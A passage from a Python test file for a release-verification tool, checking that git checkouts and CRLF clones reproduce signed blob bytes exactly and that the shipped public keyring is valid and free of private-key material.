        return subprocess.run(["git", "-C", str(repo), *args], capture_output=True, check=True)

    git("init", "-q", "-b", "main")
    git("config", "user.email", "t@e.com")
    git("config", "user.name", "T")
    for name in ("README.md", "scripts/a.py", "scripts/B.py", "Makefile"):
        target = repo / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("x\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "normal")
    commit = git("rev-parse", "HEAD").stdout.decode().strip()
    roster = acquire_mod.commit_roster(repo, commit)
    assert len(roster) == 4


def test_checking_out_this_repository_reproduces_the_blobs_exactly(tmp_path):
    """The assumption the whole design rests on, measured rather than asserted.

    `acquire` verifies a COMMIT and then a caller checks that commit out. That is
    only sound if `git worktree add` writes the blob bytes — and it does not, in
    general: an `eol`, `ident` or `filter` attribute transforms content on the
    way to disk. Reproduced with `*.sh text eol=crlf`, which `-c core.eol=lf`
    does not override.

    For AQG's own content it holds, because `*.sh text eol=lf` produces exactly
    what the blobs contain. Nothing enforced that, which made it an accident.
    This is the enforcement: add an attribute that transforms content and this
    test names the file it broke.
    """
    repo = Path(__file__).resolve().parents[2]
    found = subprocess.run(
        ["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True
    )
    if found.returncode != 0:
        # A tarball, or a tree carved out of a repository. There is no checkout
        # to compare against, so there is nothing here to measure — which is a
        # skip, not a failure.
        pytest.skip("not a git checkout; the property under test needs one")
    head = found.stdout.decode().strip()
    roster = acquire_mod.commit_roster(repo, head)

    worktree = tmp_path / "checked-out"
    made = subprocess.run(
        ["git", "-C", str(repo), "worktree", "add", "--detach", str(worktree), head],
        capture_output=True,
    )
    if made.returncode != 0:  # pragma: no cover - constrained environment
        pytest.skip(f"cannot create a worktree here: {made.stderr.decode()[:200]}")
    try:
        import hashlib

        differing = []
        for relpath, entry in roster.items():
            target = worktree / relpath
            if not target.is_file():
                differing.append(f"{relpath}: missing from the checkout")
                continue
            if hashlib.sha256(target.read_bytes()).hexdigest() != entry["sha256"]:
                differing.append(f"{relpath}: checkout differs from the blob")
        assert not differing, (
            "checking out this repository does not reproduce its blobs, so "
            "verifying a commit no longer implies the files on disk are the "
            f"ones that were signed: {differing[:5]}"
        )
    finally:
        subprocess.run(
            ["git", "-C", str(repo), "worktree", "remove", "--force", str(worktree)],
            capture_output=True,
        )


# --- the trust anchor this build ships -------------------------------------------------


def test_the_shipped_keyring_loads_with_the_shipped_verifier():
    """The file every install trusts, checked by the code every install runs.

    Nothing else validates it: it is data, so a typo produces a keyring that
    silently rejects every release ever signed, and the first person to notice
    would be a user whose update stopped working.
    """
    keys = trust_mod.load_trusted_keys()
    assert keys, "the shipped keyring names no keys"
    for key_id, key in keys.items():
        assert key.modulus.bit_length() >= 4096, (
            f"{key_id} is {key.modulus.bit_length()} bits; releases are signed "
            f"with 4096"
        )


def test_the_shipped_keyring_carries_no_private_material():
    """The catastrophic edit, guarded mechanically.

    A keyring is public by definition and lives in a public repository. Pasting
    a private key into it — the whole file, or one extra field — would hand the
    release signing capability to anyone who cloned. It is exactly the mistake
    that is easy to make once and impossible to take back, so it is checked
    rather than trusted to care.
    """
    raw = trust_mod.default_keyring_path().read_text(encoding="utf-8")
    for marker in (
        "PRIVATE KEY", "BEGIN RSA", "Proc-Type", "private_exponent",
        '"d"', '"p"', '"q"', "dmp1", "dmq1", "iqmp",
    ):
        assert marker not in raw, (
            f"the shipped keyring contains {marker!r} — this file is public, and "
            f"a private key in it is the signing capability given away"
        )
    document = json.loads(raw)
    allowed = {"key_id", "algorithm", "modulus_hex", "exponent", "revoked"}
    for entry in document["keys"]:
        unexpected = sorted(set(entry) - allowed)
        assert not unexpected, f"unexpected fields in a shipped key entry: {unexpected}"


def test_fresh_windows_style_clone_preserves_signed_blob_bytes(tmp_path):
    """A user's CRLF preference must not change signed distribution content."""
    import hashlib
    repo = Path(__file__).resolve().parents[2]
    if not (repo / ".git").exists():
        pytest.skip("not a git checkout; the property under test needs one")
    clone = tmp_path / "clone"
    subprocess.run([
        "git", "clone", "-q", "--no-local", "-c", "core.autocrlf=true",
        "-c", "core.eol=crlf", "-c", "core.longpaths=true", str(repo), str(clone),
    ], capture_output=True, check=True)
    head = subprocess.check_output(["git", "-C", str(clone), "rev-parse", "HEAD"]).decode().strip()
    roster = acquire_mod.commit_roster(clone, head)
    differing = [path for path, entry in roster.items()
                 if hashlib.sha256((clone / path).read_bytes()).hexdigest() != entry["sha256"]]
    assert not differing, f"CRLF clone changed signed blob bytes: {differing[:5]}"
